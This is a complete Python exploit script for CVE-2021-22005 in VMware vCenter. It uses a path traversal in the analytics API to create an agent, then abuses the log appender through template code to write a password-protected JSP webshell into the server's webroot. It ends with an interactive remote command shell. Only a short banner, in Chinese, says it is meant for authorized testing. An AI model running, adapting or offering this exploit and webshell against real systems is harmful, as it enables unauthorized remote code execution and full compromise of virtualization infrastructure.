import random
import string
import sys
import requests
import urllib3
import getopt
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_str(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def escape(_str):
    _str = _str.replace("&", "&amp;")
    _str = _str.replace("<", "&lt;")
    _str = _str.replace(">", "&gt;")
    _str = _str.replace("\"", "&quot;")
    return _str

def str_to_unicode(_str):
    unicode_str = ''
    for s in _str:
        val = ord(s)
        str_uni = "\\u{:04x}".format(val)
        unicode_str += str_uni
    return unicode_str

def shell_file(webshell_path, webshell):
    shell_file = """<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[    
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##     
                            $appender.setFile("%s")##     
                            $appender.activateOptions()##  
                            $logger.warn("%s")##   
                            $appender.setFile($orig_log)##     
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>""" % (webshell_path, webshell)
    return shell_file

def create_shell_code(shell_pwd):
    webshell = """<%%@ page import="java.util.*,java.io.*"%%>
        <HTML>
        <BODY>
            <FORM METHOD="GET" NAME="myform" ACTION="">
                <INPUT TYPE="text" NAME="cmd">
                <INPUT TYPE="submit" VALUE="Send">
            </FORM>
            <pre>
                <%%
                    if (request.getParameter("%s") !=null)
                    {
                        Process p = Runtime.getRuntime().exec(request.getParameter("%s"));
                        OutputStream os = p.getOutputStream();
                        InputStream in = p.getInputStream();
                        DataInputStream dis = new DataInputStream(in);
                        String disr = dis.readLine();
                        while ( disr != null)
                        {
                            out.println(disr);
                            disr = dis.readLine();
                        }
                    }
                %%>
            </pre>
        </BODY>
        </HTML>""" % (shell_pwd,shell_pwd)
    return str_to_unicode(webshell)

def createAgent(url,agent_name,log_param):
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (url, agent_name, log_param)
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0",
        "X-Deployment-Secret": "abc",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    json_data = {
        "manifestSpec": {},
        "objectType": "a2",
        "collectionTriggerDataNeeded": True,
        "deploymentDataNeeded": True,
        "resultNeeded": True,
        "signalCollectionCompleted": True,
        "localManifestPath": "a7",
        "localPayloadPath": "a8",
        "localObfuscationMapPath": "a9"
    }
    try:
        request = requests.post(url,json=json_data,headers=headers,verify=False)
        if request.status_code == 201:
            print('[+] Agent 创建成功.')
        else:
            print("[-] Agent 创建失败.")
            sys.exit(0)
    except Exception as e:
        print(e)
        # print("[-] Agent 创建失败.")
        sys.exit(0)

def exploit(url,agent_name,log_param,manifestData):
    exploit_url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (url,agent_name,log_param)
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0",
        "X-Deployment-Secret": "abc",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    json_data = {
        "contextData": "a3", "manifestContent": manifestData, "objectId": "a2"
    }
    try:
        request = requests.post(exploit_url,headers=headers,json=json_data,verify=False)
        if request.status_code == 200:
            url = "%s/idm/..;/%s" % (url, shell_name)
            return url
        else:
            print("[-] 利用失败.")
    except Exception as e:
        # print(e)
        print("[-] 利用失败.")

def exec_command(shell_path,shell_pwd,cmd):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    requests_data = {shell_pwd : cmd.strip()}
    try:
        request = requests.post(url=shell_path,headers=headers,data=requests_data,verify=False,proxies=proxies)
        if request.status_code == 200:
            text = BeautifulSoup(request.content.decode(),"html.parser")
            text = text.find("pre").text.strip("\n").strip()
            return text
        else:
            print("[-] 错误: 命令执行出错.")
    except Exception as e:
        # print(e)
        print("[-] 错误: 命令执行失败.")

def usage():
    print("")
    print("CVE-2021-22005_rce / vCenter任意文件上传RCE")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    global proxies
    global shell_name

    proxies = None
    usage()
    if not len(sys.argv[1:]):
        sys.exit(0)

    try:
        opts,args = getopt.getopt(sys.argv[1:],"c:u:p",["command","url","proxy"])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(0)

    for o,a in opts:
        if o in ("-u","--url"):
            url = a
        elif o in ("-c","--command"):
            cmd = a
        elif o in ("-p","--proxy"):
            proxies = {
                "http":"127.0.0.1:8080",
                "https":"127.0.0.1:8080"
            }

    shell_pwd = random_str(6)
    log_param = random_str(6)
    agent_name = random_str(6)
    shell_name = random_str(6) + ".jsp"

    webshell_path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name

    shell_code = create_shell_code(shell_pwd)
    manifestData = shell_file(webshell_path, shell_code)
    createAgent(url,agent_name,log_param)
    shell_path = exploit(url,agent_name,log_param,manifestData)

    print("[+] WebShell 路径为：%s" % shell_path)
    print("[+] WebShell 密码为：%s" % shell_pwd)
    
    if cmd != "":
        cmd_result = exec_command(shell_path, shell_pwd, cmd)
        print("[+] 预设命令执行成功：%s" % cmd_result)
    shell = input("是否启用shell(Y or N)：")
    if shell in ("y","Y"):
        while True:
            cmd = input("Jun_sheng>")
            if cmd in ("quit","exit"):
                sys.exit(0)
            shell_result = exec_command(shell_path,shell_pwd,cmd)
            if shell_result != None:
                print(shell_result)

main()
